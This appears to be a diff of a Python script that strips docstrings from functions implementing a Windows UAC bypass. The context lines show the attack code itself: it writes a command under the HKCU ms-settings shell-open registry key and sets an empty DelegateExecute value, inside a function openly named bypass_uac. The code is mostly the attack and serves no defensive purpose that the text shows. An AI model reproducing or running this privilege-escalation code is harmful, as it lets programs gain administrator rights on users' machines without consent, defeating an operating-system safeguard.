@@ -10,19 +10,12 @@ REG_PATH              = r'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
 def is_running_as_admin():
-    '''
-    Checks if the script is running with administrative privileges.
-    Returns True if is running as admin, False otherwise.
-    '''    
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
     
 def create_reg_key(key, value):
-    '''
-    Creates a reg key
-    '''
     try:        
         _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
         registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)                
@@ -32,9 +25,6 @@ def create_reg_key(key, value):
         raise
 
 def bypass_uac(cmd):
-    '''
-    Tries to bypass the UAC
-    '''
     try:
         create_reg_key(DELEGATE_EXEC_REG_KEY, '')
         create_reg_key(None, cmd)    
